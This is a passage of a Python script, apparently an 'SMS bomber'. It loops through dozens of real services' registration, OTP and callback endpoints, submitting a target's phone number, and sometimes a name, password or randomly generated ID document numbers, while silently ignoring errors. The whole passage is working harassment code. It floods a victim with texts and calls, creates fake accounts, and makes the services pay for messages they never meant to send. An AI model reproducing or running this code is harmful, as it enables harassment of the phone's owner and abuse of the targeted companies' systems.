        requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": phone,"user_info[email]": email,"user_info[password]": password,"user_info[conf_password]": password})
    except:
        pass
    try:
        requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": phone, "do": "phone"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# ### ### ## ##")
        requests.get("https://makimaki.ru/system/callback.php",params={"cb_fio": name,"cb_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",data={"data": phone, "metod": "postreg"})
    except:
        pass
    try:
        requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code",json={"phone": phone},headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"})
    except:
        pass
    try:
        requests.post("https://loany.com.ua/funct/ajax/registration/code",data={"phone":phone})
    except:
        pass
    try:
        requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",json={"url": "/api/client/phone_verification","method": "POST","data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},"headers": {"Client-Id": 5646981,"Content-Type": "application/x-www-form-urlencoded"}})
    except:
        pass
    try:
        requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone":phone, "Type": 1})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="# (###) ###-##-##")
        requests.post("https://kilovkusa.ru/ajax.php",params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},data={"phone": phonemas })
    except:
        pass
    try:
        requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9})
    except:
        pass
    try:
        requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/register",json={"phone": "+"+phone,"name": name,"is_terms_accepted": True})
    except:
        pass
    try:
        requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone":phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://iqlab.com.ua/session/ajaxregister",data={"cellphone": phonemas})
    except:
        pass
    try:
        requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": password,"application": "lkp","login": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999),"DocSeries": randint(5000, 9999),"FirstName": name,"Gender": "M","LastName": name,"SecondName": name,"Phone": phone9,"Email": email})
    except:
        pass
    try:
        requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",data={"country": "RU","csrfmiddlewaretoken": "","phone": phone})
    except:
        pass
    try:
        requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+"+phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown"})
    except:
        pass
    try:
        requests.post("https://api.imgur.com/account/v1/phones/verify",json={"phone_number": phone, "region_code": "RU"})
    except:
        pass
    try:
        requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
    except:
        pass
    try:
        requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone})
    except:
        pass
    try:
        requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": phone, "platform": "PISWeb"})
    except:
        pass
    try:
        requests.post("https://www.hatimaki.ru/register/",data={"REGISTER[LOGIN]": phone,"REGISTER[PERSONAL_PHONE]": phone,"REGISTER[SMS_CODE]": "","resend-sms": "1","REGISTER[EMAIL]": "","register_submit_button": "Зарегистрироваться"})
    except:
        pass
    try:
        requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone9}},)
    except:
        pass
    try:
        requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",json={"phone": "+"+phone,"grant_type": "password","client_id": "gcarAppMob","client_secret": "SomeRandomCharsAndNumbersMobile"})
    except:
        pass
    try:
        requests.post("https://friendsclub.ru/assets/components/pl/connector.php",data={"casePar": "authSendsms", "MobilePhone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://foodband.ru/api?call=calls",data={"customerName": name,"phone": phonemas,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.get("https://foodband.ru/api/",params={"call": "customers/sendVerificationCode","phone": phone9,"g-recaptcha-response": ""})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/5/user/otp/generate",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},data={"loginId": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
    except:
        pass
    try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
    except:
        pass
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
    except:
        pass
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonemas,"g-recaptcha-response": None})
    except:
        pass
    try:
        requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
    except:
        pass
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonemas,"password": password,"password2": password})
    except:
        pass
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
    except:
        pass
    try:
        requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
    except:
        pass
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
    except:
        pass
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonemas,"type": "register"})
    except:
        pass
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
    except:
        pass
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
    except:
        pass
    try:
        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
    except:
        pass
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
    except:
        pass
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###)###-##-##")
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonemas, "sendphone": "Далее"})
    except:
        pass
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonemas})
    except:
        pass
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
    except:
        pass
    try:
        phonemas=mask(str=phone9, maska="(###) ###-##-##")
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonemas})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://oauth.av.ru/check-phone",json={"phone": phonemas})
    except:
        pass
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
    except:
        pass
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonemas,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
    except:
        pass
